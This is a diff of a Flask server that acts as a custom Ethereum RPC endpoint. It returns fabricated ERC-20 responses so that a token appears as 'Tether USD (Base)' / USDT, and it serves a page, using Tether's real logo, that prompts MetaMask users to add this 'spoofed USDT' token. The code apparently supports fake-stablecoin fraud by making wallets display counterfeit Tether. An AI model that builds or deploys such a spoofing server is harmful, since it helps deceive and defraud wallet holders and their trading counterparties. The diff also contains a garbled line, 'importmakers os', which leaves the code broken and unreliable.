@@ -1,6 +1,6 @@
 from flask import Flask, request, jsonify, render_template_string
 import requests
-import os
+importmakers os
 from web3 import Web3
 
 app = Flask(__name__)
@@ -64,5 +64,149 @@ def handle_rpc():
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
             elif function_signature == "0x95d89b41":
-                symbol = "USDT"
-                length =
+                symbol = "USDT"  # Simplified for price feed
+                length = len(symbol)
+                length_hex = hex(32)[2:].zfill(64)
+                str_length_hex = hex(length)[2:].zfill(64)
+                str_hex = symbol.encode("utf-8").hex().ljust(64, "0")
+                result = "0x" + length_hex + str_length_hex + str_hex
+                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
+
+            elif function_signature == "0x06fdde03":
+                name = "Tether USD (Base)"
+                length = len(name)
+                length_hex = hex(32)[2:].zfill(64)
+                str_length_hex = hex(length)[2:].zfill(64)
+                str_hex = name.encode("utf-8").hex().ljust(64, "0")
+                result = "0x" + length_hex + str_length_hex + str_hex
+                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
+
+            elif function_signature == "0x18160ddd":
+                result = "0x" + hex(USDT_TOTAL_SUPPLY)[2:].zfill(64)
+                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
+
+    response = requests.post(BASE_RPC, json=data, headers={"Content-Type": "application/json"})
+    return jsonify(response.json())
+
+@app.route('/')
+def add_token():
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Add USDT to MetaMask</title>
+        <style>
+            body {
+                font-family: 'Roboto', sans-serif;
+                background-color: #f5f5f5;
+                color: #333;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                margin: 0;
+            }
+            .container {
+                background: white;
+                padding: 20px;
+                border-radius: 8px;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                width: 100%;
+                max-width: 400px;
+                text-align: center;
+            }
+            h1 {
+                font-size: 24px;
+                margin-bottom: 10px;
+            }
+            p {
+                font-size: 16px;
+                margin-bottom: 20px;
+            }
+            .token-info {
+                background: #f9f9f9;
+                padding: 10px;
+                border-radius: 5px;
+                margin-bottom: 20px;
+                text-align: left;
+            }
+            .token-info img {
+                width: 32px;
+                vertical-align: middle;
+                margin-right: 10px;
+            }
+            button {
+                background-color: #007bff;
+                color: white;
+                padding: 12px 24px;
+                border: none;
+                border-radius: 5px;
+                font-size: 16px;
+                cursor: pointer;
+                transition: background-color 0.3s;
+            }
+            button:hover {
+                background-color: #0056b3;
+            }
+            .status {
+                margin-top: 10px;
+                font-size: 14px;
+                color: #666;
+            }
+            @media (max-width: 480px) {
+                .container {
+                    margin: 10px;
+                }
+                button {
+                    width: 100%;
+                }
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>Add USDT to MetaMask</h1>
+            <p>Click below to add the spoofed USDT token to your wallet on Base Spoofed.</p>
+            <div class="token-info">
+                <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="USDT Logo">
+                <span>Tether USD (Base) - 0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2</span>
+            </div>
+            <button onclick="addToken()">Add Token</button>
+            <div class="status" id="status"></div>
+        </div>
+        <script>
+            async function addToken() {
+                const status = document.getElementById('status');
+                if (!window.ethereum) {
+                    status.textContent = 'Please install MetaMask!';
+                    return;
+                }
+                try {
+                    status.textContent = 'Requesting token addition...';
+                    await window.ethereum.request({
+                        method: 'wallet_watchAsset',
+                        params: {
+                            type: 'ERC20',
+                            options: {
+                                address: '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2',
+                                symbol: 'USDT',
+                                decimals: 6,
+                                image: 'https://assets.coingecko.com/coins/images/325/large/Tether.png'
+                            }
+                        }
+                    });
+                    status.textContent = 'Token added successfully!';
+                } catch (error) {
+                    status.textContent = 'Failed to add token: ' + error.message;
+                }
+            }
+        </script>
+    </body>
+    </html>
+    """)
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host="0.0.0.0", port=port, debug=False)
